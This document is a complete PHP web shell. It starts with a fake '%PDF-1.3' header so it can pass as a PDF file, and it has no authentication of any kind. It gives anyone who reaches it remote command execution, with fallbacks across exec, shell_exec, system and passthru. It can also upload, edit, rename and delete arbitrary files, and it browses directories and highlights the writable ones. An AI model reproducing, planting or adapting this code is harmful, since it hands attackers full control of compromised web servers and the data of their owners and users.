php
%PDF-1.3
<?php
error_reporting(0);
session_start();

function safe_exec($cmd) {
    if (function_exists('exec')) {
        exec($cmd, $output);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
        return $output;
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
        return $output;
    } else {
        return "Command execution not available!";
    }
}

function getBreadcrumbPath($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumb = "";
    $full_path = "";
    foreach ($parts as $part) {
        if ($part === "") continue;
        $full_path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb .= "<a href='?path=" . urlencode($full_path) . "'>$part</a>" . DIRECTORY_SEPARATOR;
    }
    return $breadcrumb;
}

function file_perms_to_unix($file) {
    return substr(decoct(@fileperms($file)), -4);
}

function file_perms_to_rwx($file) {
    $mode = @fileperms($file);
    if ($mode === false) return "?????????";
    $type = is_dir($file) ? 'd' : (is_link($file) ? 'l' : '-');
    $out = $type;
    $mapping = [
        ['r', 0400], ['w', 0200], ['x', 0100],
        ['r', 0040], ['w', 0020], ['x', 0010],
        ['r', 0004], ['w', 0002], ['x', 0001],
    ];
    foreach ($mapping as $m) {
        $out .= ($mode & $m[1]) ? $m[0] : '-';
    }
    return $out;
}

function perm_color_class($file) {
    if (is_dir($file)) {
        if (is_writable($file)) return 'dir-w';   // green - writable dir
        return 'dir-r';                              // red - non-writable dir
    } else {
        if (is_writable($file)) return 'file-w';  // green - writable file
        if (is_readable($file)) return 'file-n';   // white - readable but not writable
        return 'file-x';                             // red - not readable
    }
}

function get_owner_group($file) {
    $owner = function_exists('posix_getpwuid') ? @posix_getpwuid(@fileowner($file)) : false;
    $group = function_exists('posix_getgrgid') ? @posix_getgrgid(@filegroup($file)) : false;
    $oname = is_array($owner) ? $owner['name'] : @fileowner($file);
    $gname = is_array($group) ? $group['name'] : @filegroup($file);
    return $oname . ' ' . $gname;
}

function get_filesize($file) {
    $sz = @filesize($file);
    if ($sz === false) return '?';
    $units = ['B','KB','MB','GB','TB'];
    $i = 0;
    while ($sz >= 1024 && $i < count($units) - 1) {
        $sz /= 1024;
        $i++;
    }
    return round($sz, 1) . ' ' . $units[$i];
}

$requested_dir = isset($_GET['path']) ? $_GET['path'] : null;
$current_dir = ($requested_dir !== null) ? @realpath($requested_dir) : getcwd();
$path_error = '';
if ($requested_dir !== null && ($current_dir === false || !@is_dir($current_dir))) {
    if ($current_dir !== false && @is_file($current_dir)) {
        $reason = 'path ini adalah FILE, bukan direktori';
    } elseif (@file_exists($requested_dir)) {
        $reason = 'path ada tapi tidak bisa dibuka (permission)';
    } else {
        $reason = 'path tidak ditemukan / tidak dapat diakses (cek penulisan, permission, atau open_basedir=' . (ini_get('open_basedir') ?: 'none') . ')';
    }
    $path_error = "[!] Gagal membuka direktori: \"" . htmlspecialchars($requested_dir) . "\" — {$reason}";
    $current_dir = getcwd();
}
chdir($current_dir);

$status_msg = '';

if (isset($_FILES['upload'])) {
    $target_path = basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target_path)) {
        $status_msg .= "[+] Uploaded " . htmlspecialchars(basename($_FILES['upload']['name'])) . "<br>";
    } else {
        $status_msg .= "[-] Upload failed.<br>";
    }
}

if (isset($_GET['delete'])) {
    $file_to_delete = realpath($_GET['delete']);
    $success = false;
    if (is_file($file_to_delete)) {
        $success = unlink($file_to_delete);
    } elseif (is_dir($file_to_delete)) {
        $success = rmdir($file_to_delete);
    }
    if ($success) {
        $status_msg .= "[+] Deleted " . htmlspecialchars(basename($file_to_delete)) . "<br>";
    } else {
        $status_msg .= "[-] Failed to delete.<br>";
    }
}

if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old_name = $_POST['rename_old'];
    $new_name = dirname($old_name) . DIRECTORY_SEPARATOR . $_POST['rename_new'];
    if (rename($old_name, $new_name)) {
        $status_msg .= "[+] Renamed " . htmlspecialchars(basename($old_name)) . " to " . htmlspecialchars($_POST['rename_new']) . "<br>";
    } else {
        $status_msg .= "[-] Failed to rename.<br>";
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body { background-color: #0a0a0a; color: #e0e0e0; font-family: 'Courier New', monospace; font-size: 13px; }
        a { text-decoration: none; }
        input, textarea { background: #1a1a1a; color: #00ff00; border: 1px solid #444; font-family: monospace; padding: 3px; }
        input[type="submit"] { cursor: pointer; }
        table { border-collapse: collapse; width: 100%; }
        th { background: #1a1a1a; color: #aaa; padding: 5px 8px; border: 1px solid #333; text-align: left; font-weight: bold; }
        td { padding: 4px 8px; border-bottom: 1px solid #1a1a1a; }
        tr:hover { background: #1a1a1a; }

        .dir-w  { color: #00ff00; font-weight: bold; }   /* writable dir - bright green */
        .file-w { color: #00ff00; }                       /* writable file - green */
        .file-n { color: #ffffff; }                        /* readable file - white */
        .dir-r  { color: #ff4444; font-weight: bold; }    /* non-writable dir - red */
        .file-x { color: #ff4444; }                        /* not readable file - red */

        a.link-w { color: #00ff00; }
        a.link-n { color: #66ccff; }
        a.link-r { color: #ff4444; }

        .crumb a { color: #66ccff; }
        .crumb { margin-bottom: 10px; }

        .status { margin: 5px 0; padding: 5px; }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const visited = JSON.parse(localStorage.getItem("visitedLinks") || "[]");
            document.querySelectorAll("a").forEach(a => {
                const href = a.getAttribute("href");
                if (visited.includes(href)) a.style.opacity = "0.6";
                a.addEventListener("click", () => {
                    if (!visited.includes(href)) {
                        visited.push(href);
                        localStorage.setItem("visitedLinks", JSON.stringify(visited));
                    }
                });
            });
        });
    </script>
</head>
<body>
<?php
echo "<div class='crumb'>";
echo "<b>umahe:</b> " . getBreadcrumbPath($current_dir) . "<br>";
$uid = function_exists('posix_getuid') ? posix_getuid() : 'n/a';
$uname = function_exists('posix_getpwuid') ? @posix_getpwuid($uid)['name'] : $uid;
echo "<b>whoami:</b> " . htmlspecialchars($uname) . " (uid=$uid) | <b>server:</b> " . php_uname();
echo "</div>";

if (!empty($path_error)) {
    echo "<div class='status' style='color:#ff4444;'>" . $path_error . "<br>";
    echo "Menampilkan direktori shell saat ini sebagai fallback.</div>";
}
if (!empty($status_msg)) {
    echo "<div class='status'>" . $status_msg . "</div>";
}


echo "<h3>File Explorer:</h3>";

$files = @scandir($current_dir);
if ($files === false) {
    echo "Directory listing failed! Trying alternative methods.<br>";
    $files = explode("\n", safe_exec("ls -1a " . escapeshellarg($current_dir)));
}

$dirs = [];
$regular_files = [];
foreach ($files as $file) {
    if ($file === "." || $file === "..") continue;
    $file_path = realpath($current_dir . DIRECTORY_SEPARATOR . $file);
    if (!$file_path) continue;
    if (is_dir($file_path)) {
        $dirs[] = ['name' => $file, 'path' => $file_path];
    } else {
        $regular_files[] = ['name' => $file, 'path' => $file_path];
    }
}

echo "<table>";
echo "<tr><th>Perms</th><th>Octal</th><th>Owner/Group</th><th>Type</th><th>Name</th><th>Size</th><th>Actions</th></tr>";

$parent_dir = dirname($current_dir);
$parent_perms = file_perms_to_rwx($parent_dir);
$parent_octal = file_perms_to_unix($parent_dir);
$parent_class = is_writable($parent_dir) ? 'dir-w' : 'dir-r';
echo "<tr>";
echo "<td class='$parent_class'>$parent_perms</td>";
echo "<td class='$parent_class'>$parent_octal</td>";
echo "<td>" . get_owner_group($parent_dir) . "</td>";
echo "<td>DIR</td>";
echo "<td><a href='?path=" . urlencode($parent_dir) . "' class='link-" . (is_writable($parent_dir) ? 'w' : 'r') . "'>..</a></td>";
echo "<td>-</td>";
echo "<td></td>";
echo "</tr>";

foreach ($dirs as $dir) {
    $perms = file_perms_to_rwx($dir['path']);
    $octal = file_perms_to_unix($dir['path']);
    $cls = perm_color_class($dir['path']);
    $link_cls = is_writable($dir['path']) ? 'link-w' : 'link-r';
    echo "<tr>";
    echo "<td class='$cls'>$perms</td>";
    echo "<td class='$cls'>$octal</td>";
    echo "<td>" . get_owner_group($dir['path']) . "</td>";
    echo "<td>DIR</td>";
    echo "<td><a href='?path=" . urlencode($dir['path']) . "' class='$link_cls'>" . htmlspecialchars($dir['name']) . "</a></td>";
    echo "<td>-</td>";
    echo "<td>[ <a href='?delete=" . urlencode($dir['path']) . "'>Del</a> ] [ <a href='?rename=" . urlencode($dir['path']) . "'>Ren</a> ]</td>";
    echo "</tr>";
}

foreach ($regular_files as $file) {
    $perms = file_perms_to_rwx($file['path']);
    $octal = file_perms_to_unix($file['path']);
    $cls = perm_color_class($file['path']);
    $link_cls = is_writable($file['path']) ? 'link-w' : (is_readable($file['path']) ? 'link-n' : 'link-r');
    echo "<tr>";
    echo "<td class='$cls'>$perms</td>";
    echo "<td class='$cls'>$octal</td>";
    echo "<td>" . get_owner_group($file['path']) . "</td>";
    echo "<td>FILE</td>";
    echo "<td><a href='?edit=" . urlencode($file['path']) . "' class='$link_cls'>" . htmlspecialchars($file['name']) . "</a></td>";
    echo "<td>" . get_filesize($file['path']) . "</td>";
    echo "<td>[ <a href='?edit=" . urlencode($file['path']) . "'>Edit</a> ] [ <a href='?delete=" . urlencode($file['path']) . "'>Del</a> ] [ <a href='?rename=" . urlencode($file['path']) . "'>Ren</a> ]</td>";
    echo "</tr>";
}
echo "</table>";

if (isset($_GET['edit'])) {
    $file_to_edit = realpath($_GET['edit']);
    if (is_file($file_to_edit)) {
        $content = htmlspecialchars(file_get_contents($file_to_edit));
        echo "<h3>Editing '$file_to_edit':</h3>";
        echo "<form method='POST'>";
        echo "<textarea name='file_content' rows='20' cols='100'>$content</textarea><br>";
        echo "<input type='hidden' name='edit_file' value='" . htmlspecialchars($file_to_edit) . "'>";
        echo "<input type='submit' value='Save'>";
        echo "</form>";
    }
}
if (isset($_POST['file_content']) && isset($_POST['edit_file'])) {
    file_put_contents($_POST['edit_file'], $_POST['file_content']);
    echo "File saved!<br>";
}

if (isset($_GET['rename']) && !isset($_POST['rename_old'])) {
    $file_to_rename = realpath($_GET['rename']);
    echo "<h3>Renaming '$file_to_rename':</h3>";
    echo "<form method='POST'>";
    echo "<input type='hidden' name='rename_old' value='" . htmlspecialchars($file_to_rename) . "'>";
    echo "New name: <input type='text' name='rename_new' value='" . htmlspecialchars(basename($file_to_rename)) . "'><br>";
    echo "<input type='submit' value='Rename'>";
    echo "</form>";
}

echo "<h3>Upload a File:</h3>";
echo "<form enctype='multipart/form-data' method='POST'>
        <input type='file' name='upload'>
        <input type='submit' value='Upload'>
      </form>";

if (isset($_POST['cmd'])) {
    echo "<h3>Command Output:</h3>";
    echo "<pre style='color:#00ff00;'>" . htmlspecialchars(safe_exec($_POST['cmd'])) . "</pre>";
}
echo "<h3>Execute Command:</h3>";
echo "<form method='POST'>";
echo "Command: <input type='text' name='cmd' size='80'>";
echo "<input type='submit' value='Run'>";
echo "</form>";


?>
</body>
</html>